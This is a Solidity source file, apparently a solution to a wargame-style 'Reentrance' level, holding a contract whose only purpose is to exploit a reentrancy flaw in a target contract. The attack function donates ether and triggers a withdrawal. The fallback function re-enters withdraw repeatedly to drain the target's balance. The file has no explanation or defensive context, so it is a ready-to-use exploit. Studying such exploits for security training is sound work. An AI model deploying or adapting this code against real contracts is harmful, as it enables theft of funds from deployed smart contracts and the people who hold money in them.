// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Reentrance.sol";

contract ReentranceAttack {
    Reentrance REENTRANCE_TARGET;

    constructor(address payable targetAddress) {
        REENTRANCE_TARGET = Reentrance(targetAddress);
    }

    function attack() public payable {
        REENTRANCE_TARGET.donate{value: msg.value}(address(this));
        REENTRANCE_TARGET.withdraw(0);
    }

    fallback() external payable {
        uint256 thisBalance = REENTRANCE_TARGET.balanceOf(address(this));
        if (address(REENTRANCE_TARGET).balance >= thisBalance) {
            REENTRANCE_TARGET.withdraw(thisBalance);
        }
    }
}
